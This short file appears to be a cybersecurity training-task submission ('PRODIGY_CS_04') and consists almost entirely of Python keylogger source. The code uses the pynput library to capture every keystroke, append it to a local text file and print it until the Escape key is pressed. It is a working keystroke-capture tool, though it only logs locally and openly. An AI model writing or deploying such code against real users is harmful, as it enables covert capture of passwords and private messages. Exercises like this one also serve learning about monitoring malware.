# PRODIGY_CS_04
KEYLOGGER using python

from pynput.keyboard import Key, Listener

def write_key(key):
    with open("demo.txt", "a") as f:
        new_var = str(key).replace("'", '')  # Remove single quotes
        f.write(new_var + " ")  # Add a space between keystrokes

def on_press(key):
    write_key(key)  # Save key immediately
    print(key)

def on_release(key):
    if key == Key.esc:  # Stop logging when ESC is pressed
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
